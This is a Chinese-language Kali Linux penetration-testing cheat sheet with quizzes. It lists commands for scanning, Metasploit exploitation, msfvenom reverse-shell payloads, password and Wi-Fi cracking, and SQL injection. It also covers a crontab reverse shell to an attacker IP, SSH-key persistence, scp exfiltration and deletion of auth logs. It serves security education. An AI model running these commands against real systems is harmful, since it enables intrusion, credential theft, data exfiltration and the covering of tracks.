---
title: 'Kali Linux 速查表 | LabEx'
description: '使用此综合速查表学习 Kali Linux 渗透测试。快速参考安全工具、道德黑客、漏洞扫描、利用和网络安全测试。'
pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Kali Linux 速查表
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/zh/learn/kali">通过实战实验室学习 Kali Linux</a>
</base-disclaimer-title>
<base-disclaimer-content>
通过实战实验室和真实场景学习 Kali Linux 渗透测试。LabEx 提供全面的 Kali Linux 课程，涵盖基本命令、网络扫描、漏洞评估、密码攻击、Web 应用程序测试和数字取证。掌握道德黑客技术和安全审计工具。
</base-disclaimer-content>
</base-disclaimer>

## 系统设置与配置

### 初始设置：`sudo apt update`

更新系统包和存储库以获得最佳性能。

```bash
# 更新包存储库
sudo apt update
# 升级已安装的包
sudo apt upgrade
# 全系统升级
sudo apt full-upgrade
# 安装基本工具
sudo apt install curl wget git
```

### 用户管理：`sudo useradd`

创建和管理用户账户以进行安全测试。

```bash
# 添加新用户
sudo useradd -m username
# 设置密码
sudo passwd username
# 将用户添加到 sudo 组
sudo usermod -aG sudo username
# 切换用户
su - username
```

### 服务管理：`systemctl`

控制系统服务和守护进程以进行测试场景。

```bash
# 启动服务
sudo systemctl start apache2
# 停止服务
sudo systemctl stop apache2
# 在启动时启用服务
sudo systemctl enable ssh
# 检查服务状态
sudo systemctl status postgresql
```

### 网络配置：`ifconfig`

配置网络接口以进行渗透测试。

```bash
# 显示网络接口
ifconfig
# 配置 IP 地址
sudo ifconfig eth0 192.168.1.100
# 设置接口启动/关闭
sudo ifconfig eth0 up
# 配置无线接口
sudo ifconfig wlan0 up
```

### 环境变量：`export`

设置测试环境的变量和路径。

```bash
# 设置目标 IP
export TARGET=192.168.1.1
# 设置字典路径
export WORDLIST=/usr/share/wordlists/rockyou.txt
# 查看环境变量
env | grep TARGET
```

<BaseQuiz id="kali-env-1" correct="C">
  <template #question>
    使用 `export` 设置的环境变量会发生什么？
  </template>
  
  <BaseQuizOption value="A">它们在系统重启后仍然存在</BaseQuizOption>
  <BaseQuizOption value="B">它们只在当前文件中可用</BaseQuizOption>
  <BaseQuizOption value="C" correct>它们对当前 shell 和子进程可用</BaseQuizOption>
  <BaseQuizOption value="D">它们是全局系统变量</BaseQuizOption>
  
  <BaseQuizAnswer>
    使用 `export` 设置的环境变量对当前 shell 会话及其启动的所有子进程都可用。除非添加到 `.bashrc` 等 shell 配置文件中，否则在 shell 会话结束时会丢失。
  </BaseQuizAnswer>
</BaseQuiz>

### 工具安装：`apt install`

安装额外的安全工具和依赖项。

```bash
# 安装附加工具
sudo apt install nmap wireshark burpsuite
# 从 GitHub 安装
git clone https://github.com/tool/repo.git
# 安装 Python 工具
pip3 install --user tool-name
```

## 网络发现与扫描

### 主机发现：`nmap -sn`

使用 ping 扫描识别网络上的活动主机。

```bash
# Ping 扫描
nmap -sn 192.168.1.0/24
# ARP 扫描（本地网络）
nmap -PR 192.168.1.0/24
# ICMP 回显扫描
nmap -PE 192.168.1.0/24
# 快速主机发现
masscan --ping 192.168.1.0/24
```

### 端口扫描：`nmap`

扫描目标系统上的开放端口和运行的服务。

```bash
# 基本 TCP 扫描
nmap 192.168.1.1
# 侵略性扫描
nmap -A 192.168.1.1
# UDP 扫描
nmap -sU 192.168.1.1
# Stealth SYN 扫描
nmap -sS 192.168.1.1
```

<BaseQuiz id="kali-nmap-1" correct="B">
  <template #question>
    `nmap -sS` 执行什么操作？
  </template>
  
  <BaseQuizOption value="A">执行 UDP 扫描</BaseQuizOption>
  <BaseQuizOption value="B" correct>执行隐蔽的 SYN 扫描（半开扫描）</BaseQuizOption>
  <BaseQuizOption value="C">扫描所有端口</BaseQuizOption>
  <BaseQuizOption value="D">执行操作系统检测</BaseQuizOption>
  
  <BaseQuizAnswer>
    `-sS` 标志执行 SYN 扫描（也称为半开扫描），因为它从不完成 TCP 三次握手。它发送 SYN 数据包并分析响应，使其比完整的 TCP 连接扫描更隐蔽。
  </BaseQuizAnswer>
</BaseQuiz>

### 服务枚举：`nmap -sV`

识别服务版本和潜在漏洞。

```bash
# 版本检测
nmap -sV 192.168.1.1
# 操作系统检测
nmap -O 192.168.1.1
```

<BaseQuiz id="kali-enumeration-1" correct="A">
  <template #question>
    `nmap -sV` 执行什么操作？
  </template>
  
  <BaseQuizOption value="A" correct>检测开放端口上运行的服务版本</BaseQuizOption>
  <BaseQuizOption value="B">仅扫描版本控制端口</BaseQuizOption>
  <BaseQuizOption value="C">仅显示有漏洞的服务</BaseQuizOption>
  <BaseQuizOption value="D">仅执行操作系统检测</BaseQuizOption>
  
  <BaseQuizAnswer>
    `-sV` 标志启用版本检测，它会探测开放端口以确定运行的服务和版本。这对于识别与特定软件版本相关的潜在漏洞非常有用。
  </BaseQuizAnswer>
</BaseQuiz>
# 脚本扫描
nmap -sC 192.168.1.1
# 全面扫描
nmap -sS -sV -O -A 192.168.1.1
```

## 信息收集与侦察

### DNS 枚举: `dig`

收集 DNS 信息并执行区域传输。

```bash
# 基本 DNS 查询
dig example.com
# 反向 DNS 查询
dig -x 192.168.1.1
# 区域传输尝试
dig @ns1.example.com example.com axfr
# DNS 枚举
dnsrecon -d example.com
```

### Web 侦察: `dirb`

发现 Web 服务器上的隐藏目录和文件。

```bash
# 目录暴力破解
dirb http://192.168.1.1
# 自定义字典
dirb http://192.168.1.1 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# Gobuster 替代方案
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### WHOIS 信息: `whois`

收集域名的注册和所有权信息。

```bash
# WHOIS 查询
whois example.com
# IP WHOIS
whois 8.8.8.8
# 全面信息收集
theharvester -d example.com -l 100 -b google
```

### SSL/TLS 分析: `sslscan`

分析 SSL/TLS 配置和漏洞。

```bash
# SSL 扫描
sslscan 192.168.1.1:443
# Testssl 全面分析
testssl.sh https://example.com
# SSL 证书信息
openssl s_client -connect example.com:443
```

### SMB 枚举: `enum4linux`

枚举 SMB 共享和 NetBIOS 信息。

```bash
# SMB 枚举
enum4linux 192.168.1.1
# 列出 SMB 共享
smbclient -L //192.168.1.1
# 连接到共享
smbclient //192.168.1.1/share
# SMB 漏洞扫描
nmap --script smb-vuln* 192.168.1.1
```

### SNMP 枚举: `snmpwalk`

通过 SNMP 协议收集系统信息。

```bash
# SNMP walk
snmpwalk -c public -v1 192.168.1.1
# SNMP 检查
onesixtyone -c community.txt 192.168.1.1
# SNMP 枚举
snmp-check 192.168.1.1
```

## 漏洞分析与利用

### 漏洞扫描: `nessus`

使用自动化扫描器识别安全漏洞。

```bash
# 启动 Nessus 服务
sudo systemctl start nessusd
# OpenVAS 扫描
openvas-start
# Nikto Web 漏洞扫描器
nikto -h http://192.168.1.1
# SQLmap 用于 SQL 注入
sqlmap -u "http://example.com/page.php?id=1"
```

### Metasploit 框架: `msfconsole`

启动漏洞利用并管理渗透测试活动。

```bash
# 启动 Metasploit
msfconsole
# 搜索漏洞利用
search ms17-010
# 使用漏洞利用
use exploit/windows/smb/ms17_010_eternalblue
# 设置目标
set RHOSTS 192.168.1.1
```

### 缓冲区溢出测试: `pattern_create`

生成用于缓冲区溢出利用的模式。

```bash
# 创建模式
pattern_create.rb -l 400
# 查找偏移量
pattern_offset.rb -l 400 -q EIP_value
```

### 自定义漏洞利用开发: `msfvenom`

为特定目标创建自定义载荷。

```bash
# 生成 shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
# Windows 反向 Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
# Linux 反向 Shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
```

## 密码攻击与凭证测试

### 暴力破解攻击: `hydra`

对各种服务执行登录暴力破解攻击。

```bash
# SSH 暴力破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
# HTTP 表单暴力破解
hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USER^&password=^PASS^:Invalid"
# FTP 暴力破解
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### 哈希破解: `hashcat`

使用 GPU 加速破解密码哈希。

```bash
# MD5 哈希破解
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# NTLM 哈希破解
hashcat -m 1000 -a 0 ntlm.hash wordlist.txt
# 生成字典变体
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
```

### John the Ripper: `john`

使用各种攻击模式进行传统密码破解。

```bash
# 破解密码文件
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
# 显示已破解的密码
john --show shadow.txt
# 增量模式
john --incremental shadow.txt
# 自定义规则
john --rules --wordlist=passwords.txt shadow.txt
```

### 字典生成: `crunch`

创建自定义字典以进行目标攻击。

```bash
# 生成 4-8 位字典
crunch 4 8 -o wordlist.txt
# 自定义字符集
crunch 6 6 -t admin@ -o passwords.txt
# 基于模式的生成
crunch 8 8 -t @@@@%%%% -o mixed.txt
```

## 无线网络安全测试

### 监听模式设置: `airmon-ng`

配置无线适配器以进行数据包捕获和注入。

```bash
# 启用监听模式
sudo airmon-ng start wlan0
# 检查干扰进程
sudo airmon-ng check kill
# 停止监听模式
sudo airmon-ng stop wlan0mon
```

### 网络发现: `airodump-ng`

发现和监控无线网络和客户端。

```bash
# 扫描所有网络
sudo airodump-ng wlan0mon
# 针对特定网络
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# 仅显示 WEP 网络
sudo airodump-ng --encrypt WEP wlan0mon
```

### WPA/WPA2 攻击: `aircrack-ng`

对 WPA/WPA2 加密网络执行攻击。

```bash
# Deauth 攻击
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# 破解捕获的握手包
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# 使用 Reaver 进行 WPS 攻击
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### 邪恶双胞胎攻击: `hostapd`

创建虚假接入点以收集凭证。

```bash
# 启动虚假 AP
sudo hostapd hostapd.conf
# DHCP 服务
sudo dnsmasq -C dnsmasq.conf
# 捕获凭证
ettercap -T -M arp:remote /192.168.1.0/24//
```

## Web 应用程序安全测试

### SQL 注入测试: `sqlmap`

自动化的 SQL 注入检测和利用。

```bash
# 基本 SQL 注入测试
sqlmap -u "http://example.com/page.php?id=1"
# 测试 POST 参数
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
# 提取数据库
sqlmap -u "http://example.com/page.php?id=1" --dbs
# 导出特定表
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
```

### 跨站脚本 (XSS): `xsser`

测试 Web 应用程序中的 XSS 漏洞。

```bash
# XSS 测试
xsser --url "http://example.com/search.php?q=XSS"
# 自动化 XSS 检测
xsser -u "http://example.com" --crawl=10
# 自定义 payload
xsser --url "http://example.com" --payload="<script>alert(1)</script>"
```

### Burp Suite 集成: `burpsuite`

全面的 Web 应用程序安全测试平台。

```bash
# 启动 Burp Suite
burpsuite
# 配置代理 (127.0.0.1:8080)
# 设置浏览器代理以捕获流量
# 使用 Intruder 进行自动化攻击
# 使用 Spider 进行内容发现
```

### 目录遍历: `wfuzz`

测试目录遍历和文件包含漏洞。

```bash
# 目录模糊测试
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ
# 参数模糊测试
wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
```

## 渗透后与权限提升

### 系统枚举: `linpeas`

用于 Linux 系统的自动化权限提升枚举工具。

```bash
# 下载 LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
# 赋予可执行权限
chmod +x linpeas.sh
# 运行枚举
./linpeas.sh
# Windows 替代方案：winPEAS.exe
```

### 持久性机制: `crontab`

在受感染的系统上建立持久性。

```bash
# 编辑 crontab
crontab -e
# 添加反向 Shell
@reboot /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
# SSH 密钥持久性
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### 数据渗出: `scp`

安全地将数据从受感染的系统传输出来。

```bash
# 将文件复制到攻击者机器
scp file.txt user@192.168.1.100:/tmp/
# 压缩并传输
tar -czf data.tar.gz /home/user/documents
scp data.tar.gz attacker@192.168.1.100:/tmp/
# HTTP 渗出
python3 -m http.server 8000
```

### 销毁痕迹: `history`

清除受感染系统上活动的证据。

```bash
# 清除 bash 历史记录
history -c
unset HISTFILE
# 清除特定条目
history -d line_number
# 清除系统日志
sudo rm /var/log/auth.log*
```

## 数字取证与分析

### 磁盘镜像: `dd`

创建存储设备的取证镜像。

```bash
# 创建磁盘镜像
sudo dd if=/dev/sdb of=/tmp/evidence.img bs=4096 conv=noerror,sync
# 验证镜像完整性
md5sum /dev/sdb > original.md5
md5sum /tmp/evidence.img > image.md5
# 挂载镜像
sudo mkdir /mnt/evidence
sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
```

### 文件恢复: `foremost`

从磁盘镜像或驱动器中恢复已删除的文件。

```bash
# 从镜像中恢复文件
foremost -i evidence.img -o recovered/
# 特定文件类型
foremost -t jpg,png,pdf -i evidence.img -o photos/
# PhotoRec 替代方案
photorec evidence.img
```

### 内存分析: `volatility`

分析 RAM 转储以获取取证证据。

```bash
# 识别操作系统配置文件
volatility -f memory.dump imageinfo
# 列出进程
volatility -f memory.dump --profile=Win7SP1x64 pslist
# 提取进程
volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
```

### 网络数据包分析: `wireshark`

分析网络流量捕获以获取取证证据。

```bash
# 启动 Wireshark
wireshark
# 命令行分析
tshark -r capture.pcap -Y "http.request.method==GET"
# 提取文件
foremost -i capture.pcap -o extracted/
```

## 报告生成与文档记录

### 屏幕截图捕获: `gnome-screenshot`

通过系统化的屏幕截图捕获来记录发现。

```bash
# 全屏捕获
gnome-screenshot -f screenshot.png
# 窗口捕获
gnome-screenshot -w -f window.png
# 延迟捕获
gnome-screenshot -d 5 -f delayed.png
# 区域选择
gnome-screenshot -a -f area.png
```

### 日志管理: `script`

记录终端会话以供文档记录。

```bash
# 开始记录会话
script session.log
# 带时间戳记录
script -T session.time session.log
# 重放会话
scriptreplay session.time session.log
```

### 报告模板: `reportlab`

生成专业的渗透测试报告。

```bash
# 安装报告工具
pip3 install reportlab
# 生成 PDF 报告
python3 generate_report.py
# Markdown 转 PDF
pandoc report.md -o report.pdf
```

### 证据完整性: `sha256sum`

通过加密哈希维护证据保管链。

```bash
# 生成校验和
sha256sum evidence.img > evidence.sha256
# 验证完整性
sha256sum -c evidence.sha256
# 多文件校验和
find /evidence -type f -exec sha256sum {} \; > all_files.sha256
```

## 系统维护与优化

### 包管理: `apt`

维护和更新系统包和安全工具。

```bash
# 更新包列表
sudo apt update
# 升级所有包
sudo apt upgrade
# 安装特定工具
sudo apt install tool-name
# 移除不再需要的包
sudo apt autoremove
```

### 内核更新: `uname`

监控和更新系统内核以进行安全补丁。

```bash
# 检查当前内核
uname -r
# 列出可用内核
apt list --upgradable | grep linux-image
# 安装新内核
sudo apt install linux-image-generic
# 移除旧内核
sudo apt autoremove --purge
```

### 工具验证: `which`

验证工具安装并定位可执行文件。

```bash
# 定位工具
which nmap
# 检查工具是否存在
command -v metasploit
# 列出目录中的所有工具
ls /usr/bin/ | grep -i security
```

### 资源监控: `htop`

在密集的安全测试期间监控系统资源。

```bash
# 交互式进程查看器
htop
# 内存使用情况
free -h
# 磁盘使用情况
df -h
# 网络连接
netstat -tulnp
```

## 核心 Kali Linux 快捷方式与别名

### 创建别名: `.bashrc`

为常用任务设置节省时间的命令快捷方式。

```bash
# 编辑 bashrc
nano ~/.bashrc
# 添加有用的别名
alias ll='ls -la'
alias nse='nmap --script-help'
alias target='export TARGET='
alias msf='msfconsole -q'
# 重新加载 bashrc
source ~/.bashrc
```

### 自定义函数: `function`

为常见工作流程创建高级命令组合。

```bash
# 快速 nmap 扫描函数
function qscan() {
    nmap -sS -sV -O $1
}
# 渗透测试设置函数
function pentest-setup() {
    mkdir -p {recon,scans,exploits,loot}
}
```

### 键盘快捷键: Terminal

掌握基本的键盘快捷键以加快导航速度。

```bash
# 终端快捷键
# Ctrl+C - 终止当前命令
# Ctrl+Z - 暂停当前命令
# Ctrl+L - 清屏
# Ctrl+R - 搜索命令历史记录
# Tab - 自动完成命令
# 上/下箭头 - 导航命令历史记录
```

### 环境配置: `tmux`

设置持久性终端会话以运行长时间任务。

```bash
# 开始新会话
tmux new-session -s pentest
# 分离会话
# Ctrl+B, D
# 列出会话
tmux list-sessions
# 附加到会话
tmux attach -t pentest
```

## 相关链接

- <router-link to="/linux">Linux 速查表</router-link>
- <router-link to="/shell">Shell 速查表</router-link>
- <router-link to="/cybersecurity">网络安全速查表</router-link>
- <router-link to="/nmap">Nmap 速查表</router-link>
- <router-link to="/wireshark">Wireshark 速查表</router-link>
- <router-link to="/hydra">Hydra 速查表</router-link>
- <router-link to="/devops">DevOps 速查表</router-link>
- <router-link to="/docker">Docker 速查表</router-link>
